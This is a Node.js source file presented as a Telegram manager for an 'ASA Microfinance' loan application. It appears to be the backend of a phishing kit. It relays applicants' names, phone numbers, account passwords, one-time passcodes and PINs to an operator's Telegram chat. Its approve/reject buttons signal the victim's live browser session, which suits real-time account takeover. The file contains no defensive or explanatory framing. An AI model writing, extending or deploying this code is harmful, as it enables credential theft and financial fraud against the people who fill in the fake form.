/**
 * bot_manager.js
 * ASA Microfinance Telegram Manager
 * Optimized for instant message sending and correct step order
 */

require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// =====================================================
// ENV CONFIG
// =====================================================

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID");
    process.exit(1);
}

// =====================================================
// TELEGRAM BOT
// =====================================================

const bot = new TelegramBot(BOT_TOKEN, {
    polling: {
        interval: 1200,
        autoStart: true,
        params: { timeout: 20 }
    }
});

console.log("🤖 Telegram Bot Connected");

// =====================================================
// UTILITIES
// =====================================================

const escapeHTML = (str) => {
    if (!str) return "N/A";
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
};

const currency = (n) => `$${Number(n || 0).toLocaleString()}`;

const phone = (p) => p ? `+232 ${p}` : "N/A";

// =====================================================
// FIRE & FORGET SENDER (FAST)
// =====================================================

const send = (message, options = {}) => {

    bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: "HTML",
        ...options
    }).catch(err => {
        console.error("Telegram send error:", err.message);
    });

};

// =====================================================
// STEP FORMATTERS
// =====================================================

const step1 = (d) => `
💰 <b>STEP 1 – LOAN DETAILS</b>
━━━━━━━━━━━━━━━━━━━━
🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
📋 <b>Loan Type:</b> ${escapeHTML(d.loanType)}
💵 <b>Amount:</b> ${currency(d.amount)}
⏱ <b>Term:</b> ${escapeHTML(d.term)} months
📝 <b>Purpose:</b> ${escapeHTML(d.purpose)}
`;

const step2 = (d) => `
👤 <b>STEP 2 – PERSONAL INFO</b>
━━━━━━━━━━━━━━━━━━━━
🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}
📧 <b>Email:</b> ${escapeHTML(d.email)}
📞 <b>Phone:</b> ${phone(d.phone)}
`;

const step3 = (d) => `
💼 <b>STEP 3 – EMPLOYMENT</b>
━━━━━━━━━━━━━━━━━━━━
🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
📋 <b>Status:</b> ${escapeHTML(d.employment)}
💰 <b>Income:</b> ${currency(d.income)}
🏢 <b>Employer:</b> ${escapeHTML(d.employer)}
`;

const step4 = (d) => `
🔐 <b>STEP 4 – PASSWORD</b>
━━━━━━━━━━━━━━━━━━━━
🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}
📞 <b>Phone:</b> ${phone(d.phone)}
💰 <b>Amount:</b> ${currency(d.amount)}
🔑 <b>Password:</b> <code>${escapeHTML(d.password)}</code>

<i>Admin action required</i>
`;

const step5 = (d) => `
🔢 <b>STEP 5 – OTP</b>
━━━━━━━━━━━━━━━━━━━━
🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
📞 <b>Phone:</b> ${phone(d.phone)}
🔢 <b>OTP:</b> <code>${escapeHTML(d.otp)}</code>
`;

const step6 = (d) => `
🔐 <b>STEP 6 – PIN</b>
━━━━━━━━━━━━━━━━━━━━
🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>
👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}
📞 <b>Phone:</b> ${phone(d.phone)}
🔐 <b>PIN:</b> <code>${escapeHTML(d.pin)}</code>

<i>Final admin verification</i>
`;

// =====================================================
// STEP SENDERS
// =====================================================

const sendStep1 = (data) => send(step1(data));
const sendStep2 = (data) => send(step2(data));
const sendStep3 = (data) => send(step3(data));
const sendStep5 = (data) => send(step5(data));

// =====================================================
// STEP 4 WITH BUTTONS
// =====================================================

const sendStep4 = (data) => {

    send(step4(data), {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE PASSWORD", callback_data: `approve_pw_${data.appId}` },
                { text: "❌ REJECT PASSWORD", callback_data: `reject_pw_${data.appId}` }
            ]]
        }
    });

};

// =====================================================
// STEP 6 WITH BUTTONS
// =====================================================

const sendStep6 = (data) => {

    send(step6(data), {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE PIN", callback_data: `approve_pin_${data.appId}` },
                { text: "❌ REJECT PIN", callback_data: `reject_pin_${data.appId}` }
            ]]
        }
    });

};

// =====================================================
// BUTTON HANDLER
// =====================================================

bot.on("callback_query", async (query) => {

    const { data, id, message } = query;
    const [action, type, appId] = data.split("_");

    await bot.answerCallbackQuery(id).catch(()=>{});

    const io = global.io;

    if (!io) return;

    if (action === "approve") {

        if (type === "pw") {
            io.to(appId).emit("password-approved");
        }

        if (type === "pin") {
            io.to(appId).emit("pin-approved");
        }

    }

    if (action === "reject") {

        if (type === "pw") {
            io.to(appId).emit("password-rejected");
        }

        if (type === "pin") {
            io.to(appId).emit("pin-rejected");
        }

    }

});

// =====================================================
// SIMPLE MESSAGE
// =====================================================

const sendTelegramMessage = (msg) => send(msg);

// =====================================================
// EXPORTS
// =====================================================

module.exports = {
    sendStep1,
    sendStep2,
    sendStep3,
    sendStep4,
    sendStep5,
    sendStep6,
    sendTelegramMessage
};